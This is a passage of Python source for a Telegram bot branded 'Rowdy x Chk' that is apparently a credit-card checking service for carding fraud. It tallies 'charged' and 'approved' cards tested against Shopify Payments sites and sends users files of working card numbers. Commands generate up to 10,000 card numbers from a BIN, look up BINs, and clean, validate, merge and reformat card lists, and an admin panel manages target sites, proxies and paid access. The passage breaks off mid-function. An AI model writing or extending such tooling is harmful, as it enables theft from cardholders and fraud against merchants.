        hits_preview = "💤 No hits found"

    gateway = results['charged'][0].get('gateway', 'Shopify Payments') if results['charged'] else (results['approved'][0].get('gateway', 'Shopify Payments') if results['approved'] else 'Shopify Payments')
    current_time = datetime.now().strftime("%H:%M:%S")

    total_hits = len(results['charged']) + len(results['approved'])
    hit_rate = (total_hits / results['total'] * 100) if results['total'] > 0 else 0
    error_count = results.get('errors', 0)
    
    summary = f"""🏆 <b>SESSION COMPLETE</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>💎 Charged  </b>  {len(results['charged'])}
<b>✅ Approved </b>  {len(results['approved'])}
<b>❌ Dead     </b>  {len(results['dead'])}
<b>⚠️ Errors   </b>  {error_count}
<b>📦 Total    </b>  {results['total']}
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>🎯 Hit Rate </b>  {hit_rate:.1f}%
<b>🔗 Gateway  </b>  {gateway}
<b>⏱ Time     </b>  {hours:02d}h {minutes:02d}m {seconds:02d}s
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>💥 Top Hits</b>
{hits_preview}
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>🕐 {current_time}  ·  ⚡ Rowdy x Chk  |  @Rowdyking07</b>"""

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"rowdy_chk_{user_id}_{timestamp}.txt"

    async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
        await f.write("=" * 80 + "\n")
        await f.write("✦ Rowdy x Chk  |  @Rowdyking07 ✦\n")
        await f.write("=" * 80 + "\n\n")
        await f.write(f"📊 Total: {results['total']} | ✅ Charged: {len(results['charged'])} | ✅ Approved: {len(results['approved'])} | ❌ Dead: {len(results['dead'])} | ⚠️ Errors: {error_count}\n")
        await f.write(f"🔗 Gateway: {gateway} | ⏱️ Time: {hours:02d}h {minutes:02d}m {seconds:02d}s\n\n")

        if results['charged']:
            await f.write("=" * 80 + "\n")
            await f.write("✅ CHARGED HITS\n")
            await f.write("=" * 80 + "\n")
            for r in results['charged']:
                await f.write(f"{r['card']} | {r.get('gateway', 'Shopify Payments')} | {r.get('price', '0.00')} | {r['message'][:150]} | {r.get('site', 'Unknown')}\n")
            await f.write("\n")

        if results['approved']:
            await f.write("=" * 80 + "\n")
            await f.write("✅ APPROVED HITS\n")
            await f.write("=" * 80 + "\n")
            for r in results['approved']:
                await f.write(f"{r['card']} | {r.get('gateway', 'Shopify Payments')} | {r.get('price', '0.00')} | {r['message'][:150]} | {r.get('site', 'Unknown')}\n")
            await f.write("\n")

        if results['dead']:
            await f.write("=" * 80 + "\n")
            await f.write("❌ DEAD CARDS\n")
            await f.write("=" * 80 + "\n")
            for r in results['dead'][:100]:
                await f.write(f"{r['card']} | {r.get('gateway', 'Shopify Payments')} | {r.get('price', '0.00')} | {r['message'][:100]} | {r.get('site', 'Unknown')}\n")
            if len(results['dead']) > 100:
                await f.write(f"\n... and {len(results['dead']) - 100} more dead cards\n")
            await f.write("\n")
        
        error_cards = results.get('error_cards', [])
        if error_cards:
            await f.write("=" * 80 + "\n")
            await f.write("⚠️ ERROR/FAILED CARDS\n")
            await f.write("=" * 80 + "\n")
            for r in error_cards[:50]:
                await f.write(f"{r['card']} | {r.get('gateway', '')} | {r.get('price', '-')} | {str(r.get('message', ''))[:100]} | {r.get('site', '')}\n")
            if len(error_cards) > 50:
                await f.write(f"\n... and {len(error_cards) - 50} more error cards\n")
            await f.write("\n")

        await f.write("=" * 80 + "\n")
        await f.write("✦ Generated by Rowdy x Chk Bot  |  @Rowdyking07 ✦\n")

    buttons = [
        [Button.inline("📊 Full Report", "view_report"), Button.inline("🔄 Check More", "check_more")],
        [Button.inline("🏠 Home", "home")]
    ]

    try:
        await bot.send_message(user_id, premium_emoji(summary), buttons=buttons, parse_mode='html')
        await bot.send_file(user_id, filename, caption=premium_emoji("📁 <b>Full results attached below</b>"), parse_mode='html')
    except Exception as e:
        print(f"Error sending final results: {e}")
        await bot.send_message(user_id, f"❌ Error sending results: {e}", parse_mode='html')

    try:
        os.remove(filename)
    except:
        pass

# ============================================================
# TOOLS COMMANDS
# ============================================================

@bot.on(events.NewMessage(pattern='/gen'))
async def generate_cards_command(event):
    user_id = event.sender_id
    
    if is_banned(user_id):
        await event.reply(premium_emoji("⛔ <b>Access Denied</b> — your account is banned."), parse_mode='html')
        return
    
    if not is_premium(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("💎 <b>Premium Required</b>"), parse_mode='html')
        return
    
    try:
        args = event.message.text.split()
        if len(args) < 3:
            await event.reply(premium_emoji("❌ Usage: <code>/gen [BIN] [count]</code>\nExample: <code>/gen 515462 100</code>"), parse_mode='html')
            return
        
        bin_number = args[1].strip()
        count = int(args[2])
        
        if count > 10000:
            await event.reply(premium_emoji("❌ <b>Max 10000 cards allowed</b>"), parse_mode='html')
            return
        
        if count < 1:
            await event.reply(premium_emoji("❌ <b>Count must be at least 1</b>"), parse_mode='html')
            return
        
        if len(bin_number) < 6:
            await event.reply(premium_emoji("❌ <b>BIN must be at least 6 digits</b>"), parse_mode='html')
            return
        
        status_msg = await event.reply(premium_emoji(f"⏳ <b>Generating cards...</b>  BIN: {bin_number}  Count: {count}"), parse_mode='html')
        
        cards = generate_cards(bin_number, count)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"generated_{bin_number}_{timestamp}.txt"
        
        async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
            for card in cards:
                await f.write(f"{card}\n")
        
        brand, bin_type, level, bank, country, flag = await get_bin_info(bin_number + "0" * (16 - len(bin_number)))
        
        message = f"""✅ <b>GENERATED</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>🔢 BIN     </b>  <code>{bin_number}</code>
<b>📦 Count   </b>  {len(cards)}
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>🏦 Bank    </b>  {bank}
<b>💳 Brand   </b>  {brand}  ·  {bin_type}
<b>🌍 Country </b>  {country} {flag}
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>⚡ Rowdy x Chk  |  @Rowdyking07</b>"""
        
        await status_msg.delete()
        await bot.send_file(user_id, filename, caption=premium_emoji(message), parse_mode='html')
        
        try:
            os.remove(filename)
        except:
            pass
        
    except ValueError:
        await event.reply(premium_emoji("❌ <b>Invalid count. Use a number.</b>"), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/bin'))
async def bin_lookup_command(event):
    user_id = event.sender_id
    
    if is_banned(user_id):
        await event.reply(premium_emoji("⛔ <b>Access Denied</b> — your account is banned."), parse_mode='html')
        return
    
    try:
        args = event.message.text.split()
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: <code>/bin [BIN]</code>\nExample: <code>/bin 515462</code>"), parse_mode='html')
            return
        
        bin_number = args[1].strip()
        
        if len(bin_number) < 6:
            await event.reply(premium_emoji("❌ <b>BIN must be at least 6 digits</b>"), parse_mode='html')
            return
        
        status_msg = await event.reply(premium_emoji(f"🔍 <b>Looking up BIN {bin_number}...</b>"), parse_mode='html')
        
        brand, bin_type, level, bank, country, flag = await get_bin_info(bin_number + "0" * (16 - len(bin_number)))
        
        message = f"""🔍 <b>BIN LOOKUP</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>🔢 BIN     </b>  <code>{bin_number}</code>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>🏦 Bank    </b>  {bank}
<b>💳 Brand   </b>  {brand}
<b>📋 Type    </b>  {bin_type}
<b>🏅 Level   </b>  {level}
<b>🌍 Country </b>  {country} {flag}
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>⚡ Rowdy x Chk  |  @Rowdyking07</b>"""
        
        await status_msg.delete()
        await bot.send_message(user_id, premium_emoji(message), parse_mode='html')
        
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/clean'))
async def clean_cards_command(event):
    user_id = event.sender_id
    
    if is_banned(user_id):
        await event.reply(premium_emoji("⛔ <b>Access Denied</b> — your account is banned."), parse_mode='html')
        return
    
    if not is_premium(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("💎 <b>Premium Required</b>"), parse_mode='html')
        return
    
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ <b>Reply to a .txt file</b>"), parse_mode='html')
        return
    
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ <b>Please reply to a .txt file</b>"), parse_mode='html')
        return
    
    status_msg = await event.reply(premium_emoji("⏳ <b>Cleaning cards...</b>"), parse_mode='html')
    
    file_path = await reply_msg.download_media()
    
    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    
    cards = content.split('\n')
    cards = [c.strip() for c in cards if c.strip()]
    
    valid_cards, expired_count, invalid_count = clean_dead_cards(cards)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"cleaned_{timestamp}.txt"
    
    async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
        for card in valid_cards:
            await f.write(f"{card}\n")
    
    message = f"""<b>✅ Cleaning Complete!</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>📊 Original :</b> {len(cards)}
<b>✅ Valid :</b> {len(valid_cards)}
<b>❌ Invalid :</b> {invalid_count}
<b>⏳ Expired :</b> {expired_count}
<b>🗑️ Removed :</b> {invalid_count + expired_count}
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>📁 Cleaned file:</b> <code>{filename}</code>"""
    
    await status_msg.delete()
    await bot.send_file(user_id, filename, caption=premium_emoji(message), parse_mode='html')
    
    try:
        os.remove(filename)
        os.remove(file_path)
    except:
        pass

@bot.on(events.NewMessage(pattern='/split'))
async def split_file_command(event):
    user_id = event.sender_id
    
    if is_banned(user_id):
        await event.reply(premium_emoji("⛔ <b>Access Denied</b> — your account is banned."), parse_mode='html')
        return
    
    if not is_premium(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("💎 <b>Premium Required</b>"), parse_mode='html')
        return
    
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ <b>Reply to a .txt file</b>"), parse_mode='html')
        return
    
    try:
        args = event.message.text.split()
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: <code>/split [lines_per_file]</code>"), parse_mode='html')
            return
        
        lines_per_file = int(args[1])
        if lines_per_file < 1:
            await event.reply(premium_emoji("❌ <b>Lines per file must be at least 1</b>"), parse_mode='html')
            return
        
        reply_msg = await event.get_reply_message()
        if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
            await event.reply(premium_emoji("❌ <b>Please reply to a .txt file</b>"), parse_mode='html')
            return
        
        status_msg = await event.reply(premium_emoji("📂 <b>Splitting file...</b>"), parse_mode='html')
        
        file_path = await reply_msg.download_media()
        
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = await f.readlines()
        
        lines = [l.strip() for l in lines if l.strip()]
        
        total_lines = len(lines)
        total_files = math.ceil(total_lines / lines_per_file)
        
        split_files = []
        for i in range(0, total_lines, lines_per_file):
            part = i // lines_per_file + 1
            filename = f"split_part_{part}_{datetime.now().strftime('%H%M%S')}.txt"
            
            chunk = lines[i:i + lines_per_file]
            async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
                for line in chunk:
                    await f.write(f"{line}\n")
            
            split_files.append(filename)
        
        message = f"""✂️ <b>SPLIT COMPLETE</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>📊 Total Lines :</b> {total_lines}
<b>📁 Files Created :</b> {total_files}
<b>📋 Lines per file :</b> {lines_per_file}
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>Sending {total_files} files...</b>"""
        
        await status_msg.delete()
        await bot.send_message(user_id, premium_emoji(message), parse_mode='html')
        
        for filename in split_files:
            await bot.send_file(user_id, filename)
            try:
                os.remove(filename)
            except:
                pass
        
        try:
            os.remove(file_path)
        except:
            pass
        
    except ValueError:
        await event.reply(premium_emoji("❌ <b>Invalid number. Use a number.</b>"), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/merge'))
async def merge_files_command(event):
    user_id = event.sender_id
    
    if is_banned(user_id):
        await event.reply(premium_emoji("⛔ <b>Access Denied</b> — your account is banned."), parse_mode='html')
        return
    
    if not is_premium(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("💎 <b>Premium Required</b>"), parse_mode='html')
        return
    
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ <b>Reply to a .txt file</b>\n\nUsage: Reply to a .txt file and send /merge"), parse_mode='html')
        return
    
    try:
        status_msg = await event.reply(premium_emoji("⏳ <b>Merging files...</b>"), parse_mode='html')
        
        reply_msg = await event.get_reply_message()
        if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
            await status_msg.edit(premium_emoji("❌ <b>Please reply to a .txt file</b>"), parse_mode='html')
            return
        
        all_lines = []
        merged_files = 0
        
        file_path = await reply_msg.download_media()
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = await f.readlines()
        
        lines = [l.strip() for l in lines if l.strip()]
        if lines:
            all_lines.extend(lines)
            merged_files += 1
        
        try:
            os.remove(file_path)
        except:
            pass
        
        previous_msgs = []
        async for msg in bot.iter_messages(event.chat_id, limit=15, offset_id=reply_msg.id):
            if msg.file and msg.file.name.endswith('.txt') and msg.id != reply_msg.id:
                previous_msgs.append(msg)
                if len(previous_msgs) >= 10:
                    break
        
        for msg in previous_msgs:
            try:
                file_path = await msg.download_media()
                async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = await f.readlines()
                
                lines = [l.strip() for l in lines if l.strip()]
                if lines:
                    all_lines.extend(lines)
                    merged_files += 1
                    
                    await status_msg.edit(premium_emoji(f"⏳ <b>Merging...</b>  {merged_files} files  ·  {len(all_lines)} lines"), parse_mode='html')
                
                try:
                    os.remove(file_path)
                except:
                    pass
            except Exception as e:
                print(f"Error processing file: {e}")
                continue
        
        if not all_lines:
            await status_msg.edit(premium_emoji("❌ <b>No lines found to merge</b>"), parse_mode='html')
            return
        
        unique_lines = list(dict.fromkeys(all_lines))
        duplicate_count = len(all_lines) - len(unique_lines)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"merged_{merged_files}files_{timestamp}.txt"
        
        async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
            for line in unique_lines:
                await f.write(f"{line}\n")
        
        message = f"""📎 <b>MERGE COMPLETE</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>📁 Files    </b>  {merged_files}
<b>📊 Total    </b>  {len(all_lines)}
<b>🔄 Dupes    </b>  {duplicate_count} removed
<b>✅ Unique   </b>  {len(unique_lines)}
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>⚡ Rowdy x Chk  |  @Rowdyking07</b>"""
        
        await status_msg.delete()
        await bot.send_file(user_id, filename, caption=premium_emoji(message), parse_mode='html')
        
        try:
            os.remove(filename)
        except:
            pass
        
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/validate'))
async def validate_cards_command(event):
    user_id = event.sender_id
    
    if is_banned(user_id):
        await event.reply(premium_emoji("⛔ <b>Access Denied</b> — your account is banned."), parse_mode='html')
        return
    
    if not is_premium(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("💎 <b>Premium Required</b>"), parse_mode='html')
        return
    
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ <b>Reply to a .txt file</b>"), parse_mode='html')
        return
    
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ <b>Please reply to a .txt file</b>"), parse_mode='html')
        return
    
    status_msg = await event.reply(premium_emoji("⏳ <b>Validating cards...</b>"), parse_mode='html')
    
    file_path = await reply_msg.download_media()
    
    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    
    cards = content.split('\n')
    cards = [c.strip() for c in cards if c.strip()]
    
    valid_cards = []
    invalid_cards = []
    
    for card in cards:
        parts = card.split('|')
        if len(parts) == 4:
            card_num = parts[0]
            if is_valid_card(card_num):
                valid_cards.append(card)
            else:
                invalid_cards.append(card)
        else:
            invalid_cards.append(card)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    valid_filename = f"valid_{timestamp}.txt"
    invalid_filename = f"invalid_{timestamp}.txt"
    
    async with aiofiles.open(valid_filename, 'w', encoding='utf-8') as f:
        for card in valid_cards:
            await f.write(f"{card}\n")
    
    async with aiofiles.open(invalid_filename, 'w', encoding='utf-8') as f:
        for card in invalid_cards:
            await f.write(f"{card}\n")
    
    message = f"""✅ <b>VALIDATION COMPLETE</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>📊 Total   </b>  {len(cards)}
<b>✅ Valid   </b>  {len(valid_cards)}
<b>❌ Invalid </b>  {len(invalid_cards)}
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>⚡ Rowdy x Chk  |  @Rowdyking07</b>"""
    
    await status_msg.delete()
    
    if valid_cards:
        await bot.send_file(user_id, valid_filename, caption=premium_emoji("✅ <b>Valid Cards</b>"), parse_mode='html')
    
    if invalid_cards:
        await bot.send_file(user_id, invalid_filename, caption=premium_emoji("❌ <b>Invalid Cards</b>"), parse_mode='html')
    
    await bot.send_message(user_id, premium_emoji(message), parse_mode='html')
    
    try:
        os.remove(valid_filename)
        os.remove(invalid_filename)
        os.remove(file_path)
    except:
        pass

@bot.on(events.NewMessage(pattern='/convert'))
async def convert_format_command(event):
    user_id = event.sender_id
    
    if is_banned(user_id):
        await event.reply(premium_emoji("⛔ <b>Access Denied</b> — your account is banned."), parse_mode='html')
        return
    
    if not is_premium(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("💎 <b>Premium Required</b>"), parse_mode='html')
        return
    
    try:
        args = event.message.text.split()
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: <code>/convert [format]</code>\nFormats: card|mm|yy|cvv, card mm yy cvv, card-mm-yy-cvv"), parse_mode='html')
            return
        
        format_type = args[1].lower()
        
        if not event.reply_to_msg_id:
            await event.reply(premium_emoji("❌ <b>Reply to a .txt file</b>"), parse_mode='html')
            return
        
        reply_msg = await event.get_reply_message()
        if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
            await event.reply(premium_emoji("❌ <b>Please reply to a .txt file</b>"), parse_mode='html')
            return
        
        status_msg = await event.reply(premium_emoji("⏳ <b>Converting format...</b>"), parse_mode='html')
        
        file_path = await reply_msg.download_media()
        
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        
        cards = content.split('\n')
        cards = [c.strip() for c in cards if c.strip()]
        
        converted_cards = []
        
        for card in cards:
            parts = card.split('|')
            if len(parts) == 4:
                if format_type == "card mm yy cvv":
                    converted = f"{parts[0]} {parts[1]} {parts[2]} {parts[3]}"
                elif format_type == "card-mm-yy-cvv":
                    converted = f"{parts[0]}-{parts[1]}-{parts[2]}-{parts[3]}"
                elif format_type == "card|mm|yy|cvv":
                    converted = card
                else:
                    converted = card
                converted_cards.append(converted)
            else:
                converted_cards.append(card)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"converted_{timestamp}.txt"
        
        async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
            for card in converted_cards:
                await f.write(f"{card}\n")
        
        message = f"""🔄 <b>FORMAT CONVERTED</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>📊 Cards  </b>  {len(converted_cards)}
<b>📋 Format </b>  <code>{format_type}</code>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>⚡ Rowdy x Chk  |  @Rowdyking07</b>"""
        
        await status_msg.delete()
        await bot.send_file(user_id, filename, caption=premium_emoji(message), parse_mode='html')
        
        try:
            os.remove(filename)
            os.remove(file_path)
        except:
            pass
        
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

# ============================================================
# ADMIN PANEL COMMANDS
# ============================================================

@bot.on(events.NewMessage(pattern='/admin'))
async def admin_panel(event):
    user_id = event.sender_id
    
    if not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>Access Denied</b>"), parse_mode='html')
        return
    
    menu = f"""<b>𝗭𝗮𝘆𝗻 𝘅 𝗖𝗵𝗸𝗿</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>

<b>👥 𝐔𝐬𝐞𝐫 𝐌𝐚𝐧𝐚𝐠𝐞𝐦𝐞𝐧𝘁</b>
<code>/ban [user_id]      - Ban user
/unban [user_id]    - Unban user
/users              - List all users
/stats              - Bot stats</code>

<b>🔑 𝐏𝐫𝐞𝐦𝚒𝚞𝗺 𝐌𝐠𝐦𝐭</b>
<code>/genkey [days]      - Generate key
/addpremium [id]    - Add premium
/rmpremium [id]     - Remove premium
/redeem [key]       - Redeem key</code>

<b>👑 𝐀𝐝𝐦𝐢𝐧 𝐌𝐠𝐦𝐭</b>
<code>/addadmin [id]     - Add admin
/rmadmin [id]      - Remove admin
/admins            - List admins</code>

<b>📢 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭</b>
<code>/broadcast [msg]   - Send to all</code>

<b>🌐 𝐒𝐢𝐭𝐞 𝐌𝐠𝐦𝐭</b>
<code>/addsite [url]     - Add site
/rmsite [url]      - Remove site
/sites             - List sites
/checksites        - Check sites</code>

<b>🔄 𝐏𝐫𝐨𝐱𝐲 𝐌𝐠𝐦𝐭</b>
<code>/addproxy [proxy]   - Add proxy
/rmproxy [proxy]   - Remove proxy
/proxies           - List proxies
/checkproxies      - Check proxies</code>

<b>🎬 𝐒𝐭𝐚𝐫𝐭 𝐕𝐢𝐝𝐞𝐨</b>
<code>/addvideo [url]    - Add start video
/rmvideo [url]     - Remove start video
/videos            - List start videos</code>

<b>🎥 𝐆𝐈𝐅 𝐌𝐠𝐦𝐭</b>
<code>/addgif [url]      - Add result GIF
/rmgif [url]       - Remove GIF
/gifs              - List GIFs</code>

<b>⚙️ 𝐎𝐭𝐡𝐞𝐫</b>
<code>/clearcache       - Clear cache
/restart           - Restart bot</code>

<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>⚡ Rowdy x Chk  |  @Rowdyking07</b>"""
    
    await event.reply(premium_emoji(menu), parse_mode='html')

@bot.on(events.NewMessage(pattern='/addgif'))
async def add_gif(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>Access Denied</b>"), parse_mode='html')
        return
    
    try:
        args = event.message.text.split()
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: <code>/addgif [gif_url]</code>"), parse_mode='html')
            return
        
        gif_url = args[1].strip()
        gifs = load_gifs()
        
        if gif_url in gifs:
            await event.reply(premium_emoji(f"⚠️ GIF already exists."), parse_mode='html')
            return
        
        gifs.append(gif_url)
        write_file_lines(GIFS_FILE, gifs)
        
        await event.reply(premium_emoji(f"✅ <b>GIF Added!</b>\n\n<code>{gif_url}</code>"), parse_mode='html')
        
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/rmgif'))
async def remove_gif(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>Access Denied</b>"), parse_mode='html')
        return
    
    try:
        args = event.message.text.split()
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: <code>/rmgif [gif_url]</code>"), parse_mode='html')
            return
        
        gif_url = args[1].strip()
        gifs = load_gifs()
        
        if gif_url not in gifs:
            await event.reply(premium_emoji(f"⚠️ GIF not found."), parse_mode='html')
            return
        
        gifs.remove(gif_url)
        write_file_lines(GIFS_FILE, gifs)
        
        await event.reply(premium_emoji(f"✅ <b>GIF Removed!</b>\n\n<code>{gif_url}</code>"), parse_mode='html')
        
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/gifs'))
async def list_gifs(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>Access Denied</b>"), parse_mode='html')
        return
    
    gifs = load_gifs()
    
    if not gifs:
        await event.reply(premium_emoji("📊 <b>No GIFs configured</b>"), parse_mode='html')
        return
    
    gif_list = "\n".join([f"• <code>{g}</code>" for g in gifs])
    
    message = f"""🎥 <b>GIF LIST</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>Total  </b>  {len(gifs)}
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
{gif_list}
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>⚡ Rowdy x Chk  |  @Rowdyking07</b>"""
    
    await event.reply(premium_emoji(message), parse_mode='html')

@bot.on(events.NewMessage(pattern='/addvideo'))
async def add_start_video(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>Access Denied</b>"), parse_mode='html')
        return
    
    try:
        args = event.message.text.split()
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: <code>/addvideo [video_url]</code>"), parse_mode='html')
            return
        
        video_url = args[1].strip()
        videos = load_start_video()
        
        if video_url in videos:
            await event.reply(premium_emoji(f"⚠️ Video already exists."), parse_mode='html')
            return
        
        videos.append(video_url)
        write_file_lines(START_VIDEO_FILE, videos)
        
        await event.reply(premium_emoji(f"✅ <b>Start Video Added!</b>\n\n<code>{video_url}</code>"), parse_mode='html')
        
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/rmvideo'))
async def remove_start_video(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>Access Denied</b>"), parse_mode='html')
        return
    
    try:
        args = event.message.text.split()
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: <code>/rmvideo [video_url]</code>"), parse_mode='html')
            return
        
        video_url = args[1].strip()
        videos = load_start_video()
        
        if video_url not in videos:
            await event.reply(premium_emoji(f"⚠️ Video not found."), parse_mode='html')
            return
        
        videos.remove(video_url)
        write_file_lines(START_VIDEO_FILE, videos)
        
        await event.reply(premium_emoji(f"✅ <b>Start Video Removed!</b>\n\n<code>{video_url}</code>"), parse_mode='html')
        
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/videos'))
async def list_start_videos(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>Access Denied</b>"), parse_mode='html')
        return
    
    videos = load_start_video()
    
    if not videos:
        await event.reply(premium_emoji("📊 <b>No start videos configured</b>"), parse_mode='html')
        return
    
    video_list = "\n".join([f"• <code>{v}</code>" for v in videos])
    
    message = f"""🎬 <b>START VIDEOS</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>Total  </b>  {len(videos)}
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
{video_list}
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>⚡ Rowdy x Chk  |  @Rowdyking07</b>"""
    
    await event.reply(premium_emoji(message), parse_mode='html')

@bot.on(events.NewMessage(pattern='/ban'))
async def ban_user(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>Access Denied</b>"), parse_mode='html')
        return
    
    try:
        args = event.message.text.split()
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: <code>/ban [user_id]</code>"), parse_mode='html')
            return
        
        target_id = args[1].strip()
        banned = load_banned_users()
        
        if target_id in banned:
            await event.reply(premium_emoji(f"⚠️ User <code>{target_id}</code> is already banned."), parse_mode='html')
            return
        
        banned.append(target_id)
        write_file_lines(BANNED_FILE, banned)
        
        await event.reply(premium_emoji(f"✅ <b>User Banned!</b>\n\n<code>{target_id}</code> has been banned."), parse_mode='html')
        
        try:
            await bot.send_message(int(target_id), premium_emoji("❌ <b>You have been banned</b> from using this bot."), parse_mode='html')
        except:
            pass
            
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/unban'))
async def unban_user(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>Access Denied</b>"), parse_mode='html')
        return
    
    try:
        args = event.message.text.split()
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: <code>/unban [user_id]</code>"), parse_mode='html')
            return
        
        target_id = args[1].strip()
        banned = load_banned_users()
        
        if target_id not in banned:
            await event.reply(premium_emoji(f"⚠️ User <code>{target_id}</code> is not banned."), parse_mode='html')
            return
        
        banned.remove(target_id)
        write_file_lines(BANNED_FILE, banned)
        
        await event.reply(premium_emoji(f"✅ <b>User Unbanned!</b>\n\n<code>{target_id}</code> has been unbanned."), parse_mode='html')
        
        try:
            await bot.send_message(int(target_id), premium_emoji("✅ <b>Unbanned</b>\n\nYour access to Rowdy x Chk has been restored."), parse_mode='html')
        except:
            pass
            
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/users'))
async def list_users(event):
    user_id = event.sender_id
    if not is_admin(user_id):
